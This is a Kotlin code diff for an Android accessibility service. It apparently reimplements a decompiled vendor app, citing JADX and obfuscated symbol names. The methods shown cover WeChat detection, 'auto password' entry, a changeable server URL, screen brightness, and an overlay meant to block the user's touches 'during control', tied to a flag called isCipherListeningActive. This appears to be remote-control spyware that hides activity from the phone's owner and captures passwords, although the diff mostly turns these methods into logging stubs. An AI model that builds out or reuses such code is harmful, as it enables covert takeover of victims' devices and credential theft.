+    /** JADX: b3 */ fun enableWechatDetection(delayMs: Long) = detectionController?.enableWechatDetection(delayMs)
+    /** JADX: b1 */ fun enableAutoPassword(delayMs: Long) = detectionController?.enableAutoPassword(delayMs)
+    /** JADX: a8 */ fun disableAutoPassword() = detectionController?.disableAutoPassword()
 
     /**
      * Change server URL. Vendor: m211443c8(serverUrl).
@@ -2510,29 +1928,14 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Enable touch interception on MaskOverlay.
-     * Vendor: fd0.f56199a1.f55996b8.post(new RunnableC0449ea(enabled, c0454ef))
-     */
+    /** ADAPT: fd0 MaskOverlay — stub, logs + sends debug message. */
     fun setTouchInterceptionEnabled(enabled: Boolean) {
-        try {
-            // ADAPT: fd0 (MaskOverlayManager) — vendor's WindowManager-based overlay for touch interception.
-            // Requires SYSTEM_ALERT_WINDOW. The behavioral intent (blocking user interaction during control)
-            // is signaled via isControlEnabled flag.
-            android.util.Log.d(TAG, if (enabled) "🚫 触摸拦截已启用" else "✅ 触摸拦截已禁用")
-            sendDebugLog(if (enabled) "触摸拦截已启用" else "触摸拦截已禁用")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 设置触摸拦截失败", e)
-        }
+        android.util.Log.d(TAG, if (enabled) "🚫 触摸拦截已启用" else "✅ 触摸拦截已禁用")
+        sendDebugLog(if (enabled) "触摸拦截已启用" else "触摸拦截已禁用")
     }
 
-    /** Whether MaskOverlayManager is initialized. Vendor: f52423f4 != null */
-    fun isMaskOverlayInitialized(): Boolean {
-        // ADAPT: fd0 (MaskOverlayManager) — not replicated as standalone class.
-        // Return true to allow command flow to proceed; the overlay behavior is
-        // handled by ConfigProgressManager and control state flags.
-        return isCipherListeningActive
-    }
+    /** ADAPT: fd0 MaskOverlay — proxied via isCipherListeningActive. */
+    fun isMaskOverlayInitialized(): Boolean = isCipherListeningActive
 
     /**
      * Set screen brightness.
